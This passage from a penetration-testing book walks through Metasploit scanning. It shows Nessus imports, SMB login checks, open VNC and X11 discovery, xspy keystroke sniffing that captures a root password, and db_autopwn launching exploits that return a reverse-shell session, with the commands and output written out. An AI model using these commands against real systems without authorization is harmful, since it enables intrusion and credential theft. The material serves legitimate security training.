you are ready to configure a scan. Begin by selecting the <span class="strong"><strong class="calibre3">Scans</strong></span> tab, and then click the <span class="strong"><strong class="calibre3">Add</strong></span> button to open the scan configuration window. Most Nessus configuration is set in its scan policies, so when you’re setting up a scan, enter a name for the scan, choose a policy, and enter the scan targets, as shown in <a class="xref" href="part0008.html#configuring_a_nessus_scan">Figure 4-16</a>.</p><div class="figure"><a id="configuring_a_nessus_scan" class="strong"/><div class="book"><div class="book"><a id="I_mediaobject4_d1e3934" class="strong"/><img src="../images/00023.jpeg" alt="Configuring a Nessus scan" hisrc="httpatomoreillycomsourcenostarchimages867500.png.jpg" class="calibre7"/></div></div><div class="figure-title">Figure 4-16. Configuring a Nessus scan</div></div><p class="calibre2">In our example, we are scanning only one host, but you can also enter IP address ranges in CIDR notation or even upload a file containing the addresses of the targets you want to scan. When you are satisfied with the scan configuration, click <span class="strong"><strong class="calibre3">Launch Scan</strong></span>.</p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="nessus_reports">Nessus Reports</h3></div></div></div><p class="calibre2">After the scan is complete, it will no longer appear under Scans, and you should find a new entry under the Reports tab listing the name of the scan, its status, and when it was last updated. Select the report and click <span class="strong"><strong class="calibre3">Browse</strong></span> to open a summary page of the scan that shows the severity levels of the vulnerabilities found, as shown in <a class="xref" href="part0008.html#our_nessus_scan_report_summary">Figure 4-17</a>.<a id="IDX-CHP-4-0091" class="strong"/><a id="IDX-CHP-4-0092" class="strong"/><a id="IDX-CHP-4-0093" class="strong"/><a id="IDX-CHP-4-0094" class="strong"/><a id="IDX-CHP-4-0095" class="strong"/><a id="IDX-CHP-4-0096" class="strong"/><a id="IDX-CHP-4-0097" class="strong"/><a id="IDX-CHP-4-0098" class="strong"/></p><div class="figure"><a id="our_nessus_scan_report_summary" class="strong"/><div class="book"><div class="book"><a id="I_mediaobject4_d1e3994" class="strong"/><img src="../images/00024.jpeg" alt="Our Nessus scan report summary" hisrc="httpatomoreillycomsourcenostarchimages867502.png.jpg" class="calibre7"/></div></div><div class="figure-title">Figure 4-17. Our Nessus scan report summary</div></div><div class="book"><hr class="calibre5"/></div><div class="note"><h3 class="title4">Note</h3><p class="calibre2">Bear in mind that because this scan was run with Windows credentials, Nessus will find many more vulnerabilities than it would with an anonymous scan.</p></div><div class="book"><hr class="calibre5"/></div></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="importing_results_into_the_metasploit_fr">Importing Results into the Metasploit Framework</h3></div></div></div><p class="calibre2">Now let’s import our results into the Framework.</p><div class="book"><ol class="orderedlist" type="1"><li class="listitem" value="1">Click the <span class="strong"><strong class="calibre3">Download Report</strong></span> button on the Reports tab to save the results to your hard drive. The default file format for Nessus reports, <span class="strong"><em class="calibre4">.nessus</em></span>, can be parsed by Metasploit, so click <span class="strong"><strong class="calibre3">Submit</strong></span> when prompted to select the default format.<a id="IDX-CHP-4-0099" class="strong"/></li><li class="listitem" value="2">Load <span class="strong"><em class="calibre4">msfconsole</em></span>, create a new database with <code class="literal">db_connect</code>, and import the Nessus results file by entering <strong class="calibre3"><code class="calibre6">db_import</code></strong> followed by the report filename.<a id="I_programlisting4_d1e4035" class="strong"/><pre class="programlisting">msf &gt; <strong class="calibre3"><code class="calibre6">db_connect postgres:toor@127.0.0.1/msf3</code></strong>
msf &gt; <strong class="calibre3"><code class="calibre6">db_import /tmp/nessus_report_Host_195.nessus</code></strong>
[*] Importing 'Nessus XML (v2)' data
[*] Importing host 192.168.1.195</pre></li><li class="listitem" value="3">To verify that the scanned host and vulnerability data was imported properly, enter <strong class="calibre3"><code class="calibre6">db_hosts</code></strong> as shown next. This should output a brief listing with the target IP address, the number of services detected, and the number of vulnerabilities found by Nessus.<a id="I_programlisting4_d1e4049" class="strong"/><pre class="programlisting">msf &gt; <strong class="calibre3"><code class="calibre6">db_hosts -c address,svcs,vulns</code></strong>

Hosts
=====
address        svcs  vulns
-------        ----  -----
192.168.1.195  18    345</pre></li><li class="listitem" value="4">For a complete listing of the vulnerability data that was imported into Metasploit, enter <strong class="calibre3"><code class="calibre6">db_vulns</code></strong> without any switches, as shown here:<a id="IDX-CHP-4-0100" class="strong"/><a id="IDX-CHP-4-0101" class="strong"/><a id="IDX-CHP-4-0102" class="strong"/><a id="IDX-CHP-4-0103" class="strong"/><a id="IDX-CHP-4-0104" class="strong"/><a id="IDX-CHP-4-0105" class="strong"/><a id="IDX-CHP-4-0106" class="strong"/><a id="I_programlisting4_d1e4089" class="strong"/><pre class="programlisting">msf &gt; <strong class="calibre3"><code class="calibre6">db_vulns</code></strong>
[*] Time: Wed Mar 09 03:40:10 UTC 2011 Vuln: host=192.168.1.195
    name=NSS-10916 refs=OSVDB-755
[*] Time: Wed Mar 09 03:40:10 UTC 2011 Vuln: host=192.168.1.195
    name=NSS-10915 refs=OSVDB-754
[*] Time: Wed Mar 09 03:40:11 UTC 2011 Vuln: host=192.168.1.195
    name=NSS-10913 refs=OSVDB-752
[*] Time: Wed Mar 09 03:40:12 UTC 2011 Vuln: host=192.168.1.195
    name=NSS-10114 refs=CVE-1999-0524,OSVDB-94,CWE-200
[*] Time: Wed Mar 09 03:40:13 UTC 2011 Vuln: host=192.168.1.195
    name=NSS-11197 refs=CVE-2003-0001,BID-6535</pre></li></ol></div><p class="calibre2">At the end of your pen test, having these references available can be of great assistance when you’re writing the report for your client.</p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="scanning_with_nessus_from_within_metaspl">Scanning with Nessus from Within Metasploit</h3></div></div></div><p class="calibre2">During those times when you don’t feel like leaving the comfort of the command line, you can use the Nessus Bridge plug-in (<a class="xref" href="http://blog.zate.org/nessus-plugin-dev/" target="_top">http://blog.zate.org/nessus-plugin-dev/</a>) by Zate within Metasploit. The Nessus Bridge allows you to control Nessus completely through the Metasploit Framework, run scans, interpret results, and launch attacks based on the vulnerabilities identified through Nessus.<a id="IDX-CHP-4-0107" class="strong"/><a id="IDX-CHP-4-0108" class="strong"/></p><div class="book"><ol class="orderedlist" type="1"><li class="listitem" value="1">As in the preceding examples, first destroy the existing database with the <strong class="calibre3"><code class="calibre6">db_destroy</code></strong> command and create a new one using <strong class="calibre3"><code class="calibre6">db_connect</code></strong>.</li><li class="listitem" value="2">Load the Nessus plug-in by running <strong class="calibre3"><code class="calibre6">load nessus</code></strong>, as shown here:<a id="I_programlisting4_d1e4127" class="strong"/><pre class="programlisting">msf &gt; <strong class="calibre3"><code class="calibre6">db_destroy postgres:toor@127.0.0.1/msf3</code></strong>
[*] Warning: You will need to enter the password at the prompts below
Password:

msf &gt; <strong class="calibre3"><code class="calibre6">db_connect postgres:toor@127.0.0.1/msf3</code></strong>
msf &gt; <strong class="calibre3"><code class="calibre6">load nessus</code></strong>
[*] Nessus Bridge for Metasploit 1.1
[+] Type nessus_help for a command listing
[+] Exploit Index - (/root/.msf3/nessus_index) -  is valid.
[*] Successfully loaded plugin: Nessus</pre></li><li class="listitem" value="3">Running the command <code class="literal">nessus_help</code> will display all of the commands that the plug-in supports. The Bridge undergoes regular development and updates, so it is a good idea to check the help output periodically to see what new features, if any, have been added.</li><li class="listitem" value="4">Before starting a scan with the Bridge, you first need to authenticate to your Nessus server using <strong class="calibre3"><code class="calibre6">nessus_connect</code></strong>, as shown here:<a id="IDX-CHP-4-0109" class="strong"/><a id="IDX-CHP-4-0110" class="strong"/><a id="IDX-CHP-4-0111" class="strong"/><a id="IDX-CHP-4-0112" class="strong"/><a id="IDX-CHP-4-0113" class="strong"/><a id="IDX-CHP-4-0114" class="strong"/><a id="I_programlisting4_d1e4178" class="strong"/><pre class="programlisting">msf &gt; <strong class="calibre3"><code class="calibre6">nessus_connect dookie:s3cr3t@192.168.1.101:8834 ok</code></strong>
[*] Connecting to https://192.168.1.101:8834/ as dookie
[*] Authenticated</pre></li><li class="listitem" value="5">As with the GUI version of Nessus, you need to initiate a scan using a defined policy by its policy ID number. To list the available scan policies on the server, use <strong class="calibre3"><code class="calibre6">nessus_policy_list</code></strong>:<a id="I_programlisting4_d1e4189" class="strong"/><pre class="programlisting">msf &gt; <strong class="calibre3"><code class="calibre6">nessus_policy_list</code></strong>
[+] Nessus Policy List

ID   Name                         Comments
--   ----                         --------
-4   Internal Network Scan
-3   Web App Tests
-2   Prepare for PCI DSS audits
-1   External Network Scan
2    The_Works</pre></li><li class="listitem" value="6">Take note of the policy ID you want to use for your scan, and then launch a new scan with <strong class="calibre3"><code class="calibre6">nessus_scan_new</code></strong> followed by the policy number, a name for your scan, and your target IP address as shown next:<a id="I_programlisting4_d1e4200" class="strong"/><pre class="programlisting">msf &gt; <strong class="calibre3"><code class="calibre6">nessus_scan_new</code></strong>
[*] Usage:

[*]        nessus_scan_new &lt;policy id&gt; &lt;scan name&gt; &lt;targets&gt;
[*]        use nessus_policy_list to list all available policies
msf &gt; <strong class="calibre3"><code class="calibre6">nessus_scan_new 2 bridge_scan 192.168.1.195</code></strong>
[*] Creating scan from policy number 2, called "bridge_scan"
 and scanning 192.168.1.195
[*] Scan started.  uid is d2f1fc02-3b50-4e4e-ab8f-38b0813dd96abaeab61f312aa81e</pre></li><li class="listitem" value="7">While your scan is in progress, you can see its status by running the <strong class="calibre3"><code class="calibre6">nessus_scan_status</code></strong> command. When this command’s output responds with “No Scans Running,” as shown next, you will know that your scan has completed.<a id="I_programlisting4_d1e4214" class="strong"/><pre class="programlisting">msf &gt; <strong class="calibre3"><code class="calibre6">nessus_scan_status</code></strong>
[*] No Scans Running.</pre></li><li class="listitem" value="8">After the scan has completed, you can list the available scan reports with the <code class="literal">nessus_report_list</code> command. Identify the ID of the report you want to import and enter <strong class="calibre3"><code class="calibre6">nessus_report_get</code></strong> to download the report and import it into the Metasploit database automatically.<a id="I_programlisting4_d1e4228" class="strong"/><pre class="programlisting">msf &gt; <strong class="calibre3"><code class="calibre6">nessus_report_list</code></strong>
[+] Nessus Report List

ID                                                    Name         Status     Date
--                                                    ----         ------     ----
074dc984-05f1-57b1-f0c9-2bb80ada82fd3758887a05631c1d
  Host_195     completed  19:43 Mar 08 2011
d2f1fc02-3b50-4e4e-ab8f-38b0813dd96abaeab61f312aa81e
  bridge_scan  completed  09:37 Mar 09 2011

[*] You can:
[*] Get a list of hosts from the report: nessus_report_hosts &lt;report id&gt;
msf &gt; <strong class="calibre3"><code class="calibre6">nessus_report_get d2f1fc02-3b50-4e4e-ab8f-38b0813dd96abaeab61f312aa81e</code></strong>
[*] importing d2f1fc02-3b50-4e4e-ab8f-38b0813dd96abaeab61f312aa81e
[*] 192.168.1.195 Microsoft Windows XP Professional (English)  Done!
[+] Done</pre></li><li class="listitem" value="9">Finally, as with the other import functions demonstrated in this chapter, you can use <code class="literal">db_hosts</code> to verify that the scan data was imported successfully:<a id="IDX-CHP-4-0115" class="strong"/><a id="IDX-CHP-4-0116" class="strong"/><a id="IDX-CHP-4-0117" class="strong"/><a id="IDX-CHP-4-0118" class="strong"/><a id="IDX-CHP-4-0119" class="strong"/><a id="IDX-CHP-4-0120" class="strong"/></li></ol></div><a id="I_programlisting4_d1e4264" class="strong"/><pre class="programlisting">msf &gt; <strong class="calibre3"><code class="calibre6">db_hosts -c address,svcs,vulns</code></strong>

Hosts
=====

address        svcs  vulns
-------        ----  -----
192.168.1.195  18    345</pre><p class="calibre2">Now that you’ve seen the variation in scan results from two different products, you should have a better sense of the merit in using more than one tool for your scanning needs. It is still up to the penetration tester to interpret the results from these automated tools and turn them into actionable data.</p></div></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="specialty_vulnerability_scanners">Specialty Vulnerability Scanners</h2></div></div></div><p class="calibre2">Although many commercial vulnerability scanners are available on the market, you are not limited to them. When you want to run a scan for a specific vulnerability across a network, Metasploit’s many auxiliary modules can help you accomplish such tasks.</p><p class="calibre2">The following Metasploit modules are just a few examples of the many useful auxiliary scanning modules included in the Framework. Take advantage of your lab to probe and explore as many of them as you can.</p><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="validating_smb_logins">Validating SMB Logins</h3></div></div></div><p class="calibre2">To check the validity of a username and password combination, use the SMB Login Check Scanner to connect to a range of hosts. As you might expect, this scan is loud and noticeable, and each login attempt will show up in the event logs of <span class="strong"><em class="calibre4">every</em></span> Windows box it encounters.</p><p class="calibre2">After selecting the <span class="strong"><em class="calibre4">smb_login</em></span> module with <code class="literal">use</code>, you can run <code class="literal">show_options</code> to see the settings listed under the Required column. Metasploit allows you to specify a username and password combination, a username and password list, or a combination of either. In the next example, <code class="literal">RHOSTS</code> is set to a small range of IP addresses and a username and password are configured for Metasploit to try against all addresses.<a id="IDX-CHP-4-0121" class="strong"/></p><a id="I_programlisting4_d1e4303" class="strong"/><pre class="programlisting">msf &gt; <strong class="calibre3"><code class="calibre6">use auxiliary/scanner/smb/smb_login</code></strong>
  msf auxiliary(smb_login) &gt; <strong class="calibre3"><code class="calibre6">show options</code></strong>

  Module options:

     Name           Current Setting  Required  Description
     ----           ---------------  --------  -----------
     PASS_FILE                       no        File containing passwords, one per line
     RHOSTS                          yes       The target
 address range or CIDR identifier
     RPORT          445              yes       Set the SMB service port
     SMBDomain      WORKGROUP        no        SMB Domain
     SMBPass        password         no        SMB Password
     SMBUser        Administrator    no        SMB Username
     THREADS        50               yes       The number of concurrent threads
     USERPASS_FILE                   no        File containing
 users and passwords separated
                                                 by space, one pair per line
     USER_FILE                       no        File containing usernames, one per line

  msf auxiliary(smb_login) &gt; <strong class="calibre3"><code class="calibre6">set RHOSTS 192.168.1.150-155</code></strong>
  RHOSTS =&gt; 192.168.1.170-192.168.1.175
  msf auxiliary(smb_login) &gt; <strong class="calibre3"><code class="calibre6">set SMBUser Administrator</code></strong>
  SMBUser =&gt; Administrator
  msf auxiliary(smb_login) &gt; <strong class="calibre3"><code class="calibre6">set SMBPass s3cr3t</code></strong>
  SMBPass =&gt; s3cr3t
  msf auxiliary(smb_login) &gt; <strong class="calibre3"><code class="calibre6">run</code></strong>
  [*] Starting host 192.168.1.154
  [*] Starting host 192.168.1.150
  [*] Starting host 192.168.1.152
  [*] Starting host 192.168.1.151
  [*] Starting host 192.168.1.153
  [*] Starting host 192.168.1.155
<img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/> [+] 192.168.1.155 - SUCCESSFUL LOGIN (Windows 5.1) 'Administrator' : 's3cr3t'
  [*] Scanned 4 of 6 hosts (066% complete)
  [*] Scanned 5 of 6 hosts (083% complete)
  [*] Scanned 6 of 6 hosts (100% complete)
  [*] Auxiliary module execution completed
  msf auxiliary(smb_login) &gt;</pre><p class="calibre2">You can see a successful login with user <span class="strong"><em class="calibre4">Administrator</em></span> and a password of <span class="strong"><em class="calibre4">s3cr3t</em></span> at <span class="inlinemediaobject"><a id="I_inlinemediaobject4_d1e4338" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span>. Because workstations are all cloned from one image and deployed through the enterprise in many corporate environments, the administrator password may well be the same on all of them, granting you access to every workstation on the network.<a id="IDX-CHP-4-0122" class="strong"/><a id="IDX-CHP-4-0123" class="strong"/><a id="IDX-CHP-4-0124" class="strong"/></p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="scanning_for_open_vnc_authentication">Scanning for Open VNC Authentication</h3></div></div></div><p class="calibre2">Virtual network computing (VNC) provides graphical access to remote systems in a way that’s similar to Microsoft’s Remote Desktop. VNC installations are common throughout corporations, because they provide a GUI-based view of server and workstation desktops. VNC is frequently installed to meet a temporary need and then completely forgotten and left unpatched, creating a major potential vulnerability. Metasploit’s built-in VNC Authentication None scanner searches a range of IP addresses for VNC servers that do not have a password configured (that support “None” authentication, meaning a blank password). Usually, this scan will turn up nothing of value, but a good penetration tester leaves no stone unturned when looking for ways access a target system.<a id="IDX-CHP-4-0125" class="strong"/><a id="IDX-CHP-4-0126" class="strong"/><a id="IDX-CHP-4-0127" class="strong"/></p><div class="book"><hr class="calibre5"/></div><div class="note"><h3 class="title4">Note</h3><p class="calibre2">Recent VNC servers do not allow blank passwords. To set one up in your lab for testing, use older VNC servers such as RealVNC 4.1.1.</p></div><div class="book"><hr class="calibre5"/></div><p class="calibre2">The VNC scanner, like most Metasploit auxiliary modules, is easy to configure and run. The only required configuration for <code class="literal">vnc_none_auth</code> is to supply it with an IP or a range of IPs to scan. Simply select the module, define your <code class="literal">RHOSTS</code> and <code class="literal">THREADS</code>, if desired, and run it, as shown next:</p><a id="I_programlisting4_d1e4383" class="strong"/><pre class="programlisting">msf &gt; <strong class="calibre3"><code class="calibre6">use auxiliary/scanner/vnc/vnc_none_auth</code></strong>
  msf auxiliary(vnc_none_auth) &gt; <strong class="calibre3"><code class="calibre6">show options</code></strong>

  Module options:

     Name     Current Setting  Required  Description
     ----     ---------------  --------  -----------
     RHOSTS                    yes       The target address range or CIDR identifier
     RPORT    5900             yes       The target port
     THREADS  1                yes       The number of concurrent threads

  msf auxiliary(vnc_none_auth) &gt; <strong class="calibre3"><code class="calibre6">set RHOSTS 192.168.1.155</code></strong>
  RHOSTS =&gt; 192.168.1.155
  msf auxiliary(vnc_none_auth) &gt; <strong class="calibre3"><code class="calibre6">run</code></strong>

  [*] 192.168.1.155:5900, VNC server protocol version : RFB 003.008
  [*] 192.168.1.155:5900, VNC server security types supported : None
<img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/> [*] 192.168.1.155:5900, VNC server security types includes None, free access!
  [*] Scanned 1 of 1 hosts (100% complete)
  [*] Auxiliary module execution completed
  msf auxiliary(vnc_none_auth) &gt;</pre><p class="calibre2">If you get lucky and Metasploit finds a VNC server with no authentication <span class="inlinemediaobject"><a id="I_inlinemediaobject4_d1e4405" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span>, you can use Back|Track’s <span class="strong"><em class="calibre4">vncviewer</em></span> to connect to the target machine without a password, as shown in <a class="xref" href="part0008.html#connecting_to_vnc_with_no_authentication">Figure 4-18</a>.</p><div class="figure"><a id="connecting_to_vnc_with_no_authentication" class="strong"/><div class="book"><div class="book"><a id="I_mediaobject4_d1e4421" class="strong"/><img src="../images/00025.jpeg" alt="Connecting to VNC with no authentication using vncviewer" hisrc="httpatomoreillycomsourcenostarchimages867504.png.jpg" class="calibre7"/></div></div><div class="figure-title">Figure 4-18. Connecting to VNC with no authentication using <span class="strong"><em class="calibre4">vncviewer</em></span></div></div><p class="calibre2">If you think a VNC scan is likely to be a waste of time and that you’ll never find systems with open VNC servers enabled, think again. During a large penetration test, which included thousands of systems, one of the authors noticed that one of those systems had an open VNC server.<a id="IDX-CHP-4-0128" class="strong"/><a id="IDX-CHP-4-0129" class="strong"/><a id="IDX-CHP-4-0130" class="strong"/><a id="IDX-CHP-4-0131" class="strong"/><a id="IDX-CHP-4-0132" class="strong"/></p><p class="calibre2">While the author was in the system documenting his finding, he noticed activity on the system. This was overnight on a system that was unlikely to have an authorized user on it. While not always considered a best practice, the author pretended to be another unauthorized intruder and engaged the intruder in conversation via Notepad. The intruder was not very bright and told the author that he was scanning large blocks of systems for open VNC servers. Here is a segment of the conversation:</p><div class="blockquote"><blockquote class="blockquote1"><div class="book"><span class="strong"><em class="calibre4">Author:</em></span> You in the us? or out of country? I know some people in denmark.</div><div class="book"><span class="strong"><em class="calibre4">Attacker:</em></span> I’m from Norway actually, hehe, I have relatives in Denmark.</div><div class="book"><span class="strong"><em class="calibre4">Author:</em></span> You hang in any boards? like I used to like some but they have been going away</div><div class="book"><span class="strong"><em class="calibre4">Attacker:</em></span> I mostly hang in some programming boards, but not much else. Have you been into hacking for a long time or what? What’s your age btw? I’m 22.</div><div class="book"><span class="strong"><em class="calibre4">Author:</em></span> I have been on this for like fun for around a year or so. Still in school. 16. Just something to do.</div><div class="book"><span class="strong"><em class="calibre4">Attacker:</em></span> Haven’t been there. I too mostly do this for fun, just trying to see what I can do, test my skills. I wrote the “VNC finder” myself btw, I have found a lot of servers, but this is the only one where I could actually have some fun</div><div class="book"><span class="strong"><em class="calibre4">Author:</em></span> Wow. What did you write it in? Can I dl it? Do you have a handle?</div><div class="book"><span class="strong"><em class="calibre4">Attacker:</em></span> It’s written in a language called PureBasic, but it’s kinda not ready for release yet, it’s only for my own use. But maybe I can share it anyway, I could upload the code somewhere and let you compile it. That is if you can find some PureBasic compiler on some warez site :P</div><div class="book"><span class="strong"><em class="calibre4">Author:</em></span> Thats cool. you can put it in that pastebin site from irc. That lets you anon post I have not done purebasic before. just python and perl</div><div class="book"><span class="strong"><em class="calibre4">Attacker:</em></span> Let me see, I’ll look for that pastebin site and upload it, just give me some minutes, I’ll be around.</div></blockquote></div><p class="calibre2">The attacker then gave the author a link to a pastebin page with the full source for the custom VNC scanner he was using.</p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="scanning_for_open_x11_servers">Scanning for Open X11 Servers</h3></div></div></div><p class="calibre2">Metasploit’s built-in <span class="strong"><em class="calibre4">open_x11</em></span> scanner is similar to the <span class="strong"><em class="calibre4">vnc_auth</em></span> scanner, in that it scours a range of hosts for X11 servers that allow users to connect with-out authentication. Although X11 servers aren’t widely used today, lots of archaic boxes out there are still running old, unpatched, and forgotten operating systems. As you’ve seen in the preceding two examples, legacy systems are often the most vulnerable systems on a network.<a id="IDX-CHP-4-0133" class="strong"/></p><p class="calibre2">To run the <span class="strong"><em class="calibre4">open_x11</em></span> scanner, simply configure as you would most other auxiliary modules by setting the <code class="literal">RHOSTS</code> and, optionally, the <code class="literal">THREADS</code> values. A session is shown next. Notice at IP address 192.168.1.23 that the scanner has found an open X server. This is a serious vulnerability because it allows an attacker to gain unauthenticated access to the system: The X system handles the GUI including the mouse and keyboard.</p><a id="I_programlisting4_d1e4515" class="strong"/><pre class="programlisting">msf &gt; <strong class="calibre3"><code class="calibre6">use auxiliary/scanner/x11/open_x11</code></strong>
msf auxiliary(open_x11) &gt; <strong class="calibre3"><code class="calibre6">show options</code></strong>

Module options:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target address range or CIDR identifier
   RPORT    6000             yes       The target port
   THREADS  1                yes       The number of concurrent threads

msf auxiliary(open_x11) &gt; <strong class="calibre3"><code class="calibre6">set RHOSTS 192.168.1.0/24</code></strong>
RHOSTS =&gt; 192.168.1.0/24
msf auxiliary(open_x11) &gt; <strong class="calibre3"><code class="calibre6">set THREADS 50</code></strong>
THREADS =&gt; 50
msf auxiliary(open_x11) &gt; <strong class="calibre3"><code class="calibre6">run</code></strong>
[*] Trying 192.168.1.1
[*] Trying 192.168.1.0
[*] Trying 192.168.1.2...
[*] Trying 192.168.1.29
[*] Trying 192.168.1.30
[*] Open X Server @ 192.168.1.23 (The XFree86 Project, Inc)
[*] Trying 192.168.1.31
[*] Trying 192.168.1.32

<strong class="calibre3"><code class="calibre6">. . . SNIP . . .</code></strong>

[*] Trying 192.168.1.253
[*] Trying 192.168.1.254
[*] Trying 192.168.1.255
[*] Auxiliary module execution completed</pre><p class="calibre2">To see what an attacker could do with a vulnerability like this, start keystroke logging using Back|Track’s <span class="strong"><em class="calibre4">xspy</em></span> tool, like so:</p><a id="I_programlisting4_d1e4541" class="strong"/><pre class="programlisting">root@bt:/# <strong class="calibre3"><code class="calibre6">cd /pentest/sniffers/xspy/</code></strong>
root@bt:/pentest/sniffers/xspy# <strong class="calibre3"><code class="calibre6">./xspy -display 192.168.1.23:0 -delay 100</code></strong>

ssh root@192.168.1.11(+BackSpace)37
sup3rs3cr3tp4s5w0rd
ifconfig
exit</pre><p class="calibre2">The <span class="strong"><em class="calibre4">xspy</em></span> tool remotely sniffs the X server’s keyboard session and has captured a user running SSH to log in as root on a remote system. Vulnerabilities such as this can be rare, but when you find them they are extremely valuable.<a id="IDX-CHP-4-0134" class="strong"/><a id="IDX-CHP-4-0135" class="strong"/><a id="IDX-CHP-4-0136" class="strong"/><a id="IDX-CHP-4-0137" class="strong"/><a id="IDX-CHP-4-0138" class="strong"/><a id="IDX-CHP-4-0139" class="strong"/><a id="IDX-CHP-4-0140" class="strong"/><a id="IDX-CHP-4-0141" class="strong"/><a id="IDX-CHP-4-0142" class="strong"/></p></div></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="using_scan_results_for_autopwning">Using Scan Results for Autopwning</h2></div></div></div><p class="calibre2">Let’s take a quick diversion into exploitation. Metasploit’s Autopwn tool automatically targets and exploits a system using an open port or using the results of a vulnerability scan export. You can use Autopwn to harness the results of most vulnerability scanners, including NeXpose, Nessus, and OpenVAS.</p><p class="calibre2">For example, here’s how we could use a Nessus results import to target a system and autopwn it. Create a new database with <code class="literal">db_connect</code> and use <code class="literal">db_import</code> to import the scan report. In the next example, we run <code class="literal">db_autopwn</code> with a series of switches to launch attacks against all targets (<code class="literal">e</code>), show all matching modules (<code class="literal">t</code>), use a reverse shell payload (<code class="literal">r</code>), select exploit modules based on vulnerability (<code class="literal">x</code>), and also select based on open ports (<code class="literal">p</code>). Once <code class="literal">db_autopwn</code> launches, Metasploit begins launching exploits at the targets. Successful exploits return a shell to the attacking machine.</p><a id="I_programlisting4_d1e4621" class="strong"/><pre class="programlisting">msf &gt; <strong class="calibre3"><code class="calibre6">db_connect postgres:toor@127.0.0.1/msf3</code></strong>
  msf &gt; <strong class="calibre3"><code class="calibre6">db_import /root/nessus.nbe</code></strong>
  msf &gt; <strong class="calibre3"><code class="calibre6">db_autopwn -e -t -r -x -p</code></strong>

<img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/> [*] (<strong class="calibre3"><code class="calibre6">1/72</code></strong>
 [0 sessions]): Launching exploit/windows/mssql/ms09_004_sp_replwritetovarbin
      against 192.168.33.130:1433...
  [*] (2/72 [0 sessions]): Launching exploit/windows/smb/
psexec against 192.168.33.130:445...
  [*] (3/72 [0 sessions]): Launching exploit/windows/smb/ms06_040_netapi against
      192.168.33.130:445...

  <strong class="calibre3"><code class="calibre6">. . . SNIP . . .</code></strong>

  [*] Transmitting intermediate stager for over-sized stage...(216 bytes)
  [*] Sending stage (718336 bytes)
<img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/> [*] Meterpreter session <strong class="calibre3"><code class="calibre6">1 opened</code></strong>
 (192.168.1.101:40912 -&gt; 192.168.1.115:15991)
  [*] (72/72 [1 sessions]): Waiting on 2 launched modules to finish execution...
  [*] (72/72 [1 sessions]): Waiting on 0 launched modules to finish execution...</pre><p class="calibre2">Based on these scans, Autopwn launched 72 exploits <span class="inlinemediaobject"><a id="I_inlinemediaobject4_d1e4656" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span> and one was successful, as shown at <span class="inlinemediaobject"><a id="I_inlinemediaobject4_d1e4662" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span>. This exploit allows us full access to the machine with a Meterpreter console that will be discussed in far more depth in <a class="xref" href="part0010.html#meterpreter">Chapter 6</a>.</p><div class="book"><hr class="calibre5"/></div><div class="note"><h3 class="title4">Note</h3><p class="calibre2">One big caveat to remember when using Autopwn: If you’re going in with your Autopwn guns blazing, the target system can crash or lose stability. Autopwn has useful features not covered here, such as the ability to select only exploits that have an “Excellent” ranking, meaning it is very unlikely they will crash the remote system or service. For more information on its usage, enter <strong class="calibre3"><code class="calibre6">db_autopwn -h</code></strong>.</p></div><div class="book"><hr class="calibre5"/></div></div></section></body></html>